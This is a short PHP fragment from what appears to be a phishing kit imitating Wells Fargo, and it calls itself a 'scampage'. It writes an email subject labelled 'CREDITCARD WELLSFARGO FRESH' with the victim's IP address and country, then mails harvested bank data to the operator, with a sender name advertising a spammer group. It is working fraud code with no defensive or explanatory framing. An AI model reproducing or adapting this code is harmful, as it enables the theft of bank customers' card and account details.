...
$subject  = "✅_CREDITCARD WELLSFARGO FRESH_✅ [🔰".$_SERVER['REMOTE_ADDR']."🔰 / 💯".$_SESSION['country1']."💯] ";
$headers .= "From: 🌐LACASADESPAMMERS🌐(X-INPUT) <X-INPUT@lacasadespammers.com>" . "\r\n";
mail($yourmail, $subject, $msgbank, $headers);
}
else { 
    
        echo('you missed up with scampage');
    exit() ;
